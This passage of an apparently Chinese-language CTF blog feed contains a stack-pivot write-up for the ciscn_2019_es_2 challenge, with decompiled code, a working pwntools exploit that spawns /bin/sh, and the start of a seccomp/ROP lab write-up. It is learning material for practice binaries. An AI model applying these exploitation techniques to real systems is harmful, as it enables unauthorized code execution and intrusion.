class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;[*] &lt;span class=&#34;string&#34;&gt;&amp;#x27;/home/ubuntu/stackpivot/ciscn_2019_es_2/ciscn_2019_es_2&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Arch:     i386-&lt;span class=&#34;number&#34;&gt;32&lt;/span&gt;-little&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RELRO:    Partial RELRO&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Stack:    No canary found&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    NX:       NX enabled&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PIE:      No PIE (&lt;span class=&#34;number&#34;&gt;0x8046000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    RUNPATH:  &lt;span class=&#34;string&#34;&gt;b&amp;#x27;/home/ubuntu/glibc-all-in-one/libs/2.27-3ubuntu1.6_i386/&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt; __cdecl main(&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt; argc, const char **argv, const char **envp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  init();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  puts(&lt;span class=&#34;string&#34;&gt;&amp;quot;Welcome, my friend. What&amp;#x27;s your name?&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  vul();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt; vul()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  char s; // [esp+0h] [ebp-28h]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  memset(&amp;amp;s, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, 0x20u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &amp;amp;s, 0x30u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  printf(&lt;span class=&#34;string&#34;&gt;&amp;quot;Hello, %s\\n&amp;quot;&lt;/span&gt;, &amp;amp;s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  read(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &amp;amp;s, 0x30u);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; printf(&lt;span class=&#34;string&#34;&gt;&amp;quot;Hello, %s\\n&amp;quot;&lt;/span&gt;, &amp;amp;s);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		能看到存在明显的栈溢出,而且是两次,&lt;font color=&#34;red&#34;&gt;但是溢出的字节有限,只能覆盖个ebp和返回地址&lt;/font&gt;,栈的大小是0x28, 后面4字节ebp,4字节返回地址, 正好0x30,也就是读取输入的大小&lt;/p&gt;
&lt;p&gt;​		利用00截断的bug,可以让printf一直输出,memset设置了0x20个0,给覆盖掉即可,这样的话,第一次输出就可以得到栈的地址,然后通过覆盖返回地址为leave;ret;(加上函数本身就有一次leave;ret;), 两次leave;ret;就把esp迁移到栈的缓冲区上,就可以执行第二次输入的payload了&lt;/p&gt;
&lt;h2 id=&#34;找缓冲区位置&#34;&gt;&lt;a href=&#34;#找缓冲区位置&#34; class=&#34;headerlink&#34; title=&#34;找缓冲区位置&#34;&gt;&lt;/a&gt;找缓冲区位置&lt;/h2&gt;&lt;p&gt;​		pwndbg&amp;gt; ni Hello, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbccc&lt;/p&gt;
&lt;p&gt;​		输出的话,会从ecx(缓冲区开始的地方),一直往下输出,&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/image-20230410115230094.png&#34; alt=&#34;image-20230410115230094&#34;&gt;&lt;/p&gt;
&lt;p&gt;​		所以0x28之后的就是ebp了,ebp和ecx的差了0x28个字节,所以ebp-0x28就是ecx&lt;/p&gt;
&lt;p&gt;​		&lt;font color=&#34;red&#34;&gt;这种思路不对, 因为输出的是ebp这个地址存的值,而不是ebp本身的值&lt;/font&gt;,这个值,是ebp的地址加0x10&lt;/p&gt;
&lt;p&gt;​		所以ecx的地址应当是接收到的ebp存储的值-0x28-0x10 所以就是ebp-0x38&lt;/p&gt;
&lt;h2 id=&#34;栈迁移-1&#34;&gt;&lt;a href=&#34;#栈迁移-1&#34; class=&#34;headerlink&#34; title=&#34;栈迁移&#34;&gt;&lt;/a&gt;栈迁移&lt;/h2&gt;&lt;p&gt;​		可以把ebp伪造成ecx的地址, 然后返回地址leave;ret; (再加上本身函数就有一个leave;ret;) 这样两次就可以修改esp,改变程序控制流, 回去打system(”&amp;#x2F;bin&amp;#x2F;sh”)&lt;/p&gt;
&lt;h2 id=&#34;system-getshell&#34;&gt;&lt;a href=&#34;#system-getshell&#34; class=&#34;headerlink&#34; title=&#34;system getshell&#34;&gt;&lt;/a&gt;system getshell&lt;/h2&gt;&lt;p&gt;​		system的话 用plt表的0x804A018 ,got表不行吗?&lt;/p&gt;
&lt;p&gt;​		plt的顺序到底是啥…先plt还是先got, 还是说因为plt就是跳到got,所以直接引用got也可以&lt;/p&gt;
&lt;p&gt;​		p32(system_addr) + p32(0) + p32(”&amp;#x2F;bin&amp;#x2F;sh”) &lt;font color=&#34;red&#34;&gt;这个是错误的,为什么呢??? 为什么直接用值不行呢??&lt;/font&gt;&lt;/p&gt;
&lt;img src=&#34;/pwn%E5%85%A5%E9%97%A8-24-%E6%A0%88%E8%BF%81%E7%A7%BB%E7%BB%83%E4%B9%A0%E9%A2%983%E9%81%93/image-20230410123536836.png&#34; alt=&#34;image-20230410123536836&#34; style=&#34;zoom: 33%;&#34;&gt;

&lt;p&gt;​		应该是payload &amp;#x3D; p32(callsystem)+p32(0)+p32(ecx_addr+12)+b”&amp;#x2F;bin&amp;#x2F;sh”&lt;/p&gt;
&lt;p&gt;​		直接binsh字符串是不行的,需要一个指向这个字符串的地址,所以用的这个,记得后面要加\x00作为结束符号&lt;/p&gt;
&lt;h2 id=&#34;exp-1&#34;&gt;&lt;a href=&#34;#exp-1&#34; class=&#34;headerlink&#34; title=&#34;exp&#34;&gt;&lt;/a&gt;exp&lt;/h2&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; pwn &lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; *&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#sh = remote(&amp;quot;node4.buuoj.cn&amp;quot;,29945)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh = process(&lt;span class=&#34;string&#34;&gt;&amp;quot;./ciscn_2019_es_2&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.log_level= &lt;span class=&#34;string&#34;&gt;&amp;quot;debug&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;context.terminal = [&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmux&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;splitw&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;-h&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#gdb.attach(sh,&amp;quot;b _start&amp;quot;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#context.arch= &amp;#x27;x86_64&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = &lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt; + &lt;span class=&#34;string&#34;&gt;b&amp;quot;b&amp;quot;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.sendafter(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;name?&amp;#x27;&lt;/span&gt;,payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;quot;bbbbbbbb&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ecx_addr = u32(sh.recv(&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)) - &lt;span class=&#34;number&#34;&gt;0x38&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;callsystem = &lt;span class=&#34;number&#34;&gt;0x8048400&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;leave_ret = &lt;span class=&#34;number&#34;&gt;0x080484b8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload = p32(callsystem) + p32(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) + p32(ecx_addr+&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;)+&lt;span class=&#34;string&#34;&gt;b&amp;quot;/bin/sh\x00&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#payload = p32(callsystem) + p32(leave_ret) + b&amp;quot;/bin/sh\x00&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload  = payload.ljust(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;quot;a&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;payload += p32(ecx_addr-&lt;span class=&#34;number&#34;&gt;4&lt;/span&gt;)+p32(leave_ret)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.send(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;h2 id=&#34;做题思路及知识点&#34;&gt;&lt;a href=&#34;#做题思路及知识点&#34; class=&#34;headerlink&#34; title=&#34;做题思路及知识点&#34;&gt;&lt;/a&gt;做题思路及知识点&lt;/h2&gt;&lt;p&gt;1.可以明确这题本身不能往bss写的,没有途径,只能往栈上写&lt;/p&gt;
&lt;p&gt;2.本身栈里存的是0? 怎么知道   memset那里设置了&lt;/p&gt;
&lt;p&gt;3.read结束之后不会在末尾加上’\x00’，而printf不遇到’\x00’就不会停止打印，  这个知识点怎么来的呢???? 前面的memset提示??  或许可以是一个知识储备,这个好像是一个常用的点&lt;/p&gt;
&lt;p&gt;4.假的后门函数,这个是echo 字符串flag&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.text:0804854B hack            proc near&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0804854B ; __unwind &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0804854B                 push    ebp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0804854C                 mov     ebp, esp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0804854E                 sub     esp, &lt;span class=&#34;number&#34;&gt;8&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:08048551                 sub     esp, 0Ch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:08048554                 push    offset command  ; &lt;span class=&#34;string&#34;&gt;&amp;quot;echo flag&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:08048559                 call    _system&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:0804855E                 add     esp, 10h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:08048561                 nop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:08048562                 leave&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:08048563                 retn&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:08048563 ; &amp;#125; // starts at 804854B&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:08048563 hack            endp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;计算机基础不是很牢固…所以有些细节理解不到..&lt;/p&gt;
&lt;h2 id=&#34;留下的疑问&#34;&gt;&lt;a href=&#34;#留下的疑问&#34; class=&#34;headerlink&#34; title=&#34;留下的疑问&#34;&gt;&lt;/a&gt;留下的疑问&lt;/h2&gt;&lt;p&gt;​		system的话 用plt表的0x804A018 ,got表不行吗?&lt;/p&gt;
&lt;p&gt;​		plt的顺序到底是啥…先plt还是先got, 还是说因为plt就是跳到got,所以直接引用got也可以&lt;/p&gt;
&lt;h1 id=&#34;参考-1&#34;&gt;&lt;a href=&#34;#参考-1&#34; class=&#34;headerlink&#34; title=&#34;参考&#34;&gt;&lt;/a&gt;参考&lt;/h1&gt;&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_34010404/article/details/123809796&#34;&gt;https://blog.csdn.net/qq_34010404/article/details/123809796&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/mcmuyanga/article/details/113389703&#34;&gt;https://blog.csdn.net/mcmuyanga/article/details/113389703&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_45691294/article/details/112196127&#34;&gt;https://blog.csdn.net/qq_45691294/article/details/112196127&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_41696518/article/details/126665825&#34;&gt;https://blog.csdn.net/qq_41696518/article/details/126665825&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://blog.csdn.net/qq_41202237/article/details/105913597&#34;&gt;https://blog.csdn.net/qq_41202237/article/details/105913597&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://xz.aliyun.com/t/12189&#34;&gt;https://xz.aliyun.com/t/12189&lt;/a&gt;&lt;/p&gt;
</content>
        <category term="PWN入门" />
        <updated>2023-04-10T03:48:31.000Z</updated>
    </entry>
    <entry>
        <id>https://tangzichengcc.github.io/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/</id>
        <title>ucas-高级网络攻防-实验二-pwn1-栈</title>
        <link rel="alternate" href="https://tangzichengcc.github.io/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/"/>
        <content type="html">&lt;p&gt;题目链接:&lt;a href=&#34;https://tangzichengcc.github.io/2023/04/04/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/rop&#34;&gt;https://tangzichengcc.github.io/2023/04/04/ucas-高级网络攻防-实验二-pwn1-栈/rop&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;课上的pwn的练习1,总结来说基础差的太多,一个是漏洞基础,应该先对相应的漏洞的简单题多练一练,深入理解原理,不然后面遇到一点问题就卡住了,另外还是有很多底层的原理,基础知识需要补.&lt;/p&gt;
&lt;h1 id=&#34;第一章-解题过程描述&#34;&gt;&lt;a href=&#34;#第一章-解题过程描述&#34; class=&#34;headerlink&#34; title=&#34;第一章 解题过程描述&#34;&gt;&lt;/a&gt;第一章 解题过程描述&lt;/h1&gt;&lt;h2 id=&#34;一-攻击流程图&#34;&gt;&lt;a href=&#34;#一-攻击流程图&#34; class=&#34;headerlink&#34; title=&#34;一. 攻击流程图&#34;&gt;&lt;/a&gt;一. 攻击流程图&lt;/h2&gt;&lt;p&gt;&lt;img src=&#34;/ucas-%E9%AB%98%E7%BA%A7%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%AE%9E%E9%AA%8C%E4%BA%8C-pwn1-%E6%A0%88/orw.drawio.png&#34; alt=&#34;orw.drawio&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;二-详细解题过程&#34;&gt;&lt;a href=&#34;#二-详细解题过程&#34; class=&#34;headerlink&#34; title=&#34;二. 详细解题过程&#34;&gt;&lt;/a&gt;二. 详细解题过程&lt;/h2&gt;&lt;h3 id=&#34;1-ida反汇编查看伪代码&#34;&gt;&lt;a href=&#34;#1-ida反汇编查看伪代码&#34; class=&#34;headerlink&#34; title=&#34;1.ida反汇编查看伪代码&#34;&gt;&lt;/a&gt;1.ida反汇编查看伪代码&lt;/h3&gt;&lt;p&gt;​		可以发现有install_seccomp(argc, argv, envp);函数,说明安装了保护&lt;/p&gt;
&lt;p&gt;​		漏洞点在vuln函数中,存在栈溢出,但只能溢出8字节,显然空间非常需要,需要利用其他技术来布置后续攻击代码&lt;/p&gt;
&lt;h3 id=&#34;2-seccomp保护&#34;&gt;&lt;a href=&#34;#2-seccomp保护&#34; class=&#34;headerlink&#34; title=&#34;2. seccomp保护&#34;&gt;&lt;/a&gt;2. seccomp保护&lt;/h3&gt;&lt;p&gt;​		利用工具seccomp-tools查看&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;root@VM-24-10-ubuntu:/tmp/330# seccomp-tools dump ./rop &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; line  CODE  JT   JF      K&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;=================================&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0000: 0x20 0x00 0x00 0x00000004  A = arch&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0001: 0x15 0x00 0x0c 0xc000003e  if (A != ARCH_X86_64) goto 0014&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0002: 0x20 0x00 0x00 0x00000000  A = sys_number&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0003: 0x35 0x0a 0x00 0x40000000  if (A &amp;gt;= 0x40000000) goto 0014&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0004: 0x15 0x08 0x00 0x00000002  if (A == open) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0005: 0x15 0x07 0x00 0x00000101  if (A == openat) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0006: 0x15 0x06 0x00 0x000001b5  if (A == 0x1b5) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0007: 0x15 0x05 0x00 0x00000000  if (A == read) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0008: 0x15 0x04 0x00 0x00000001  if (A == write) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0009: 0x15 0x03 0x00 0x00000003  if (A == close) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0010: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0011: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0013&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0012: 0x06 0x00 0x00 0x00050005  return ERRNO(5)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0013: 0x06 0x00 0x00 0x7fff0000  return ALLOW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; 0014: 0x06 0x00 0x00 0x00000000  return KILL&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		这段代码的作用是在64位的x86架构上过滤掉不需要的系统调用，只允许执行一些特定的系统调用。如果系统调用是这些特定的系统调用之一，则允许执行，否则拒绝执行。&lt;/p&gt;
&lt;p&gt;​		具体允许的只有open,read,write,exit及其变种. 并且限制了架构,不能使用其他架构下的系统调用. 那么常用的方法是,构造orw链,利用open read write系统调用来读取和打印flag文件.&lt;/p&gt;
&lt;h3 id=&#34;3-寻找gadget&#34;&gt;&lt;a href=&#34;#3-寻找gadget&#34; class=&#34;headerlink&#34; title=&#34;3. 寻找gadget&#34;&gt;&lt;/a&gt;3. 寻找gadget&lt;/h3&gt;&lt;h4 id=&#34;3-1-orw&#34;&gt;&lt;a href=&#34;#3-1-orw&#34; class=&#34;headerlink&#34; title=&#34;3.1 orw&#34;&gt;&lt;/a&gt;3.1 orw&lt;/h4&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span 